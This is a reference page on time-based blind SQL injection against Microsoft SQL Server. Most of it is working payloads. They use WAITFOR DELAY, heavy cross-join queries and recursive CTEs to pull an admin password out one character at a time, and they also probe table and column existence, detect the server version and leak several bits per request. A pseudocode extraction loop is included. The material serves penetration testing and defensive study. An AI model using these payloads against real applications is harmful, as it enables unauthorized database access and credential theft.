---
title: Timing
description: Time-based techniques for MSSQL injection attacks
category: Injection Techniques
order: 11
tags: ["time-based", "blind injection", "waitfor"]
lastUpdated: 2026-10-08
---

Time-based SQL injection is a blind technique that allows attackers to extract information from a database by analyzing the time it takes for queries to execute. This approach is useful when the application doesn't return error messages or query results directly, but the attacker can observe response timing differences.

## MSSQL Time Delay Functions

Microsoft SQL Server provides several ways to introduce time delays:

| Method               | Description                                | Example                                   |
| -------------------- | ------------------------------------------ | ----------------------------------------- |
| `WAITFOR DELAY`      | Pauses execution for a duration (hh:mm:ss) | `WAITFOR DELAY '0:0:5'` (5 seconds)       |
| `WAITFOR TIME`       | Waits until a specific time of day         | `WAITFOR TIME '23:59:59'`                 |
| Computational delays | A query that takes long to evaluate        | Cartesian join, recursive CTE (see below) |

`WAITFOR` is a statement, not a function: it cannot appear inside a `SELECT` or a `WHERE` clause. A payload has to end the original statement and start a new one (stacked queries). T-SQL does not require a `;` between statements, so `' IF 1=1 WAITFOR DELAY '0:0:5'--` closes the string, ends the `SELECT`, and runs the `IF` as a second statement. This only works when the injection point is in the last statement of the batch and the driver allows multiple statements, which is the case for most SQL Server client libraries.

## Basic Time-Based Injection

The most straightforward approach is to use `WAITFOR DELAY` (string context, e.g. `WHERE username = '<input>'`):

```sql
' IF 1=1 WAITFOR DELAY '0:0:5'--
' IF 1=0 WAITFOR DELAY '0:0:5'--
```

If the response takes approximately 5 seconds for the first payload but returns immediately for the second, the injection is successful. In a numeric context, drop the leading quote: `1 IF 1=1 WAITFOR DELAY '0:0:5'--`.

## Conditional Time-Based Extraction

By combining conditional logic with time delays, you can extract information one character at a time:

```sql
-- Check if 'admin' user exists
' IF (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 WAITFOR DELAY '0:0:5'--

-- Extract password character by character (is the first character 'A', ASCII 65?)
' IF ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'admin'), 1, 1)) = 65 WAITFOR DELAY '0:0:5'--
```

## Nested Conditions with Timing

For more complex extractions, compare against a range instead of a single value:

```sql
-- Is the code of the first character below 80?
' IF ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'admin'), 1, 1)) < 80 WAITFOR DELAY '0:0:5'--
```

## Binary Data Extraction

Binary search halves the range on each request, so a printable character (32-126) takes about 7 requests instead of up to 95:

```text
1. ' IF ASCII(...) < 80 WAITFOR DELAY '0:0:5'--   delayed: 32-79, otherwise 80-126
2. ' IF ASCII(...) < 56 WAITFOR DELAY '0:0:5'--   (if step 1 delayed) delayed: 32-55, otherwise 56-79
3. ' IF ASCII(...) < 68 WAITFOR DELAY '0:0:5'--   (if step 2 not delayed) delayed: 56-67, otherwise 68-79
...repeat until the range holds a single value
```

## Alternative Time Delay Methods

When `WAITFOR` is blocked, or stacked queries are not possible, a query that takes long to evaluate can serve as the delay. The optimizer computes a plain `COUNT(*)` over a cross join from the row counts without joining anything, so the query needs a predicate it cannot fold, such as a string comparison. The delay depends on the server and on how many rows the user can see: measure the true and false cases first and tune the source tables.

### Heavy Queries

```sql
-- Stacked: about 20 seconds on a test server when the condition is true
' IF (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 SELECT COUNT_BIG(*) FROM sys.all_objects a, sys.all_objects b WHERE a.name + b.name LIKE '%z%'--

-- Inline, no stacked query needed (numeric context): the subquery only runs when the CASE branch is taken
1 AND 1=(CASE WHEN (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 THEN (SELECT COUNT_BIG(*) FROM sys.all_objects a, sys.all_objects b WHERE a.name + b.name LIKE '%z%') ELSE 1 END)--
```

The inline form only delays when the rest of the `WHERE` clause lets the row be evaluated (here `id = 1` must match a row).

### Recursive CTEs

```sql
-- Using a recursive CTE for delay (one million iterations, a few seconds)
' IF (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 WITH q(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM q WHERE n < 1000000) SELECT COUNT(*) FROM q OPTION (MAXRECURSION 0)--
```

`MAXRECURSION 0` removes the default limit of 100 levels; the `WHERE n < ...` bound stops the recursion and sets the length of the delay.

## Practical Attack Examples

### Data Exfiltration Script Concept

A time-based attack to extract data usually involves:

1. Testing each position in the target data
2. For each position, testing possible characters (or using binary search)
3. Measuring response time to determine correct characters

```text
# Pseudocode for extracting the admin password
for position in 1..password_length:
    for code in 32..126:   # printable ASCII
        send: ' IF ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'admin'), <position>, 1)) = <code> WAITFOR DELAY '0:0:5'--
        if response_time >= 5 seconds:
            password[position] = chr(code)
            break
```

### Database Version Detection

`@@MICROSOFTVERSION / 0x01000000` (undocumented) returns the major version number (13 = 2016, 14 = 2017, 15 = 2019, 16 = 2022, 17 = 2025):

```sql
-- Check if the SQL Server major version is 13 (SQL Server 2016)
' IF @@MICROSOFTVERSION / 0x01000000 = 13 WAITFOR DELAY '0:0:5'--
```

### Table/Column Existence

```sql
-- Check if a specific table exists in the current database
' IF EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = 'credit_cards') WAITFOR DELAY '0:0:5'--

-- Check if a column exists in a table
' IF EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name = 'users' AND column_name = 'password') WAITFOR DELAY '0:0:5'--
```

## Optimizing Time-Based Injection

### Effective Delays

```sql
-- Finding the right delay time
-- Too short: might be missed due to network latency
-- Too long: attack takes longer
-- Recommended: 1-5 seconds depending on connection stability
' IF 1=1 WAITFOR DELAY '0:0:2'--
```

### Batch Processing

Several `IF ... WAITFOR` statements in one payload add up their delays, so one request can reveal several bits. Here the total delay (0 to 7 seconds) is the value of the three low bits of the first character:

```sql
-- Extracting multiple bits in one request
' IF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) & 1) = 1 WAITFOR DELAY '0:0:1';
IF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) & 2) = 2 WAITFOR DELAY '0:0:2';
IF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) & 4) = 4 WAITFOR DELAY '0:0:4'--
```

## Limitations and Considerations

1. Time-based techniques are generally slower than other methods
2. Network latency and server load can cause false positives/negatives
3. Some environments have query execution timeouts
4. Modern security tools often detect and block time-based attacks
5. Multiple simultaneous connections may affect timing accuracy
